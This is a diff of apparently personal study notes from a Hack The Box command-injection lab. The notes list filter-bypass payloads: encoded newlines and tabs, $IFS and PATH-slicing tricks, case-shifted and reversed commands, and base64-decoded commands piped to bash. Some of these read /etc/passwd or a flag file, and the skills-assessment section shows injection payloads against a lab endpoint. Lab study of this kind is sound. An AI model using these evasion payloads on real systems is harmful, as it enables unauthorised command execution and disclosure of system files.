@@ -44,21 +44,21 @@ H4ck3rxPK@htb[/htb]$ echo ${PATH:1:3}
 ### <span style=color:blue>Bypassing Space Filters</span>
 #### Using Tabs
 ```bash!
-127.0.0.1%0a%09
+%0a%09
 ```
 #### Using $IFS
 ```bash!
-127.0.0.1%0a{IFS}
+%0a{IFS}
 ```
 #### Using Brace Expansion
 ```bash!
-127.0.0.1%0a{ls,-la}
+%0a{ls,-la}
 ```
 ### <span style=color:blue>Bypassing Other Blacklisted Characters</span>
 ```bash!
-127.0.0.1${LS_COLORS:10:1}${IFS}
+${LS_COLORS:10:1}${IFS}
 
-127.0.0.1${LS_COLORS:10:1}%0A${IFS}ls${IFS}${PATH:0:1}home
+${LS_COLORS:10:1}%0A${IFS}ls${IFS}${PATH:0:1}home
 ```
 #### Character Shifting
 ```bash!
@@ -69,18 +69,18 @@ H4ck3rxPK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
 ```
 ### <span style=color:blue>Bypassing Blacklisted Commands</span>
 ```bash!
-127.0.0.1%0A${IFS}c'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+${IFS}c'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
 ```
 ### <span style=color:darkblue>Advanced Advanced Command Obfuscation</span>
 ```bash!
-21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
 ```
 ![](https://hackmd.io/_uploads/SyLC2boa2.png)
 
 ![](https://hackmd.io/_uploads/rydp3-oa3.png)
 ---
 
-``Need to match the space in command``
+``Need to match the space in command ➔ %09(TAB) replace %20(space)``
 
 ---
 ### Reverse Command
@@ -88,7 +88,11 @@ H4ck3rxPK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
 H4ck3rxPK@htb[/htb]$ echo 'whoami' | rev
 imaohw
 ```
+```bash!
+H4ck3rxPK@htb[/htb]$ $(rev<<<'imaohw')
+```
 
+### Encoded Commands
 ```bash!
 H4ck3rxPK@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
 
@@ -103,13 +107,6 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 1. ``Find encryption by myself and decryption that to escape WAF rule``
 2. ``Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.``
 ---
-
-```bash!
-127.0.0.1%0A$(rev<<<'dnif')%09${PATH:0:1}usr${PATH:0:1}share${PATH:0:1}%09
-```
-```bash!
-127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlIHwgZ3JlcCByb290IHwgZ3JlcCBteXNxbA==)
-```
 ## [<span style=color:red>**Bashfuscator**](https://github.com/Bashfuscator/Bashfuscator)</span>
 
 ![](https://hackmd.io/_uploads/B1hZLV262.png)
@@ -135,14 +132,18 @@ root:x:0:0:root:/root:/bin/bash
 ...SNIP...
 ```
 
-## Skills Assessment
+## Skills Assessment Payload
 
+#### <span style=color:red>**{COLORS_LS:10:1}Not Found**</style>
+![](https://hackmd.io/_uploads/S1WPh02an.png)
+
+#### Payload
 ```php!
-94.237.48.48:37835/index.php?to=%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")&from=877915113.txt&finish=1&move=1
+%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
 ```
 ```php!
-94.237.48.48:37835/index.php?to=%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"LS")%09${PATH:0:1}&from=877915113.txt&finish=1&move=1
-                                                                                  
+%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"LS")%09${PATH:0:1}
+                                             
 bin
 boot
 dev
@@ -167,18 +168,12 @@ usr
 var
 ```
 ```php!
-94.237.48.48:37835/index.php?to=%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"cAt")%09${PATH:0:1}flag.txt&from=877915113.txt&finish=1&move=1
+%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"cAt")%09${PATH:0:1}flag.txt
 ```
-
-![](https://hackmd.io/_uploads/S1WPh02an.png)
-
-![](https://hackmd.io/_uploads/BJf7M1p62.png)
-
+#### Another Payload
+```bash!
 echo -n 'cat /flag.txt' | base64
-
+```
+```bash！
 bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
-
-Moved from /var/www/html/files/2380029473.txt to /var/www/html/files/%{COLORS_LS:10:1}bash<<<$(base64 -d<<<Y2F0IC9mbGFnLnR4dA==)
-
-{COLORS_LS:10:1}Not Found
-
+```
